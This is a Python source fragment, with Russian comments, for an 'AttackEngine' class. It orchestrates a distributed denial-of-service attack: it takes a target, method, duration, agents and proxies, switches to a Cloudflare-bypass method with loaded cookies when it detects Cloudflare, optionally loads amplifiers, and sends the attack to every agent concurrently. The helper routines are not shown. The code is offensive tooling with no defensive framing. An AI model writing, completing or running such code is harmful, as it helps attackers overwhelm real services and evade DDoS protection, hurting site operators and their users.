class AttackEngine:
    def __init__(self, target, method, duration, agents, proxies, use_amplification=False):
        self.target = target
        self.method = method
        self.duration = duration
        self.agents = agents
        self.proxies = proxies
        self.use_amplification = use_amplification

    async def prepare(self):
        # Проверка цели, подбор оптимального метода
        if await self._is_cloudflare(self.target):
            self.method = "HTTP_BYPASS"
            self._load_cf_cookies()
        if self.use_amplification:
            self._load_amplifiers()

    async def start(self):
        # Распределение задач по агентам с учётом их мощности
        tasks = []
        for agent in self.agents:
            task = agent.execute(self.target, self.method, self.duration)
            tasks.append(task)
        results = await asyncio.gather(*tasks)
        return self._aggregate_results(results)
